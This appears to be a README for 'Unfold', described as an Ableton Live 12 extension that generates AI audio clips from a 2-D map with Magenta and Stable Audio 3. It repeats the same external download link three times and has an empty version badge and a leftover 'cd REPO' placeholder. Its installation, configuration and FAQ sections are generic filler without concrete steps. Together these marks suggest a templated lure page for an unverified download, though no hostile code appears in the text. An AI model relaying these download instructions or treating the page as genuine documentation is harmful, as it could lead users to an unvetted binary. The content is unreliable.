# Unfold - Ableton Live extension 2026

> **Unfold is an Ableton Live 12 extension for creating AI-generated clips from a 2-D exploration map, giving music producers a visual way to sketch, audition, and place new audio ideas with Magenta and Stable Audio 3 support in the current release.**

[![Platform](https://img.shields.io/badge/Platform-Ableton%20Live%2012-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version--green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/reednoahpv732/unfold-live-12-extension?style=flat-square)](https://github.com/reednoahpv732/unfold-live-12-extension)

---

<p align="center">
  <a href="https://reednoahpv732.github.io/unfold-live-12-extension/">
    <img src="https://img.shields.io/badge/Download-Unfold%20Latest-brightgreen?style=for-the-badge" alt="Download Unfold">
  </a>
</p>

> **[Download Latest Build](https://reednoahpv732.github.io/unfold-live-12-extension/)**

---

[Download Latest Build](https://reednoahpv732.github.io/unfold-live-12-extension/)

---

## What Unfold Does

Unfold is built for Ableton Live 12 workflows where audio generation needs to stay close to arrangement and sound design. Its 2-D exploration map turns clip discovery into a visual process, letting you move between ideas, compare options, and refine variations without leaving Live.

The extension is aimed at producers who want a quicker path from prompt to playable result. Whether you are testing fresh directions, browsing candidate sounds, or pulling generated clips into a session, Unfold keeps the process centered inside the project. Current support includes Magenta and Stable Audio 3, so you can switch between engines while staying in the same creative flow.

---

## Highlights

- 2-D exploration map for generating audio clips
- Support for both Magenta and Stable Audio 3 engines
- Prompt mutation driven by map axes
- Preview, regenerate, and multi-select generated dots
- Batch insert generated clips as new tracks
- Auto-adds Live BPM and key context for Stable Audio 3
- Creates new tracks without overwriting the source track
- Backend health checks with fallback behavior when Stable Audio 3 is unavailable

---

## Installation

1. Download the latest build from the release page or package provided for the repository.
2. Place the extension files in the folder used by your Ableton Live 12 setup.
3. Open Ableton Live 12 and load Unfold from the extension location you configured.

If you are working from source, clone the repository first:

```bash
git clone https://github.com/reednoahpv732/unfold-live-12-extension.git
cd REPO
```

Then follow the project-specific launch or packaging steps for your local build workflow.

---

## How to Use It

1. Open Ableton Live 12 and launch Unfold.
2. Choose an audio generation engine, such as Magenta or Stable Audio 3.
3. Use the 2-D map to explore variations by position and prompt direction.
4. Preview generated clips, regenerate any result you want to refine, and select multiple dots when needed.
5. Insert chosen clips as new tracks to continue arranging in Live.

Example workflow:

- Begin with a wide prompt or rough musical idea.
- Move around the map to try different prompt mutations.
- Compare several generated results side by side.
- Batch insert the best options into the session for further editing.

---

## Configuration Notes

Unfold uses Ableton Live context as part of its generation flow. When Stable Audio 3 is selected, the extension automatically appends the current Live BPM and key information whenever those values are available.

If your build exposes settings, keep them in the project configuration used by the extension runtime. Typical options may include:

- engine selection
- map behavior
- prompt handling
- backend connection details

Use the local configuration location provided by your installation or build process if you need to adjust these values.

---

## Requirements

- Ableton Live 12
- A supported environment for running the extension
- Access to the selected audio generation backend
- Enough local storage for the extension files and generated project assets

For best results, make sure Ableton Live can provide tempo and key context when using Stable Audio 3 features.

---

## FAQ

**How do I get updates?**  
Use the download link above and check the repository for newer builds when they are published.

**Why is Stable Audio 3 not available?**  
Unfold includes backend health checks and can fall back gracefully when the Stable Audio 3 service is unavailable.

**Where are settings stored?**  
Configuration is kept in the extension's local runtime or project-specific settings, depending on your build and installation method.

**What should I do if clips are not appearing?**  
Confirm that Ableton Live 12 is open, the extension is loaded correctly, and the selected backend is responding.

**Can I replace the source track with generated output?**  
Unfold is designed to create new tracks instead of overwriting the original source track.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
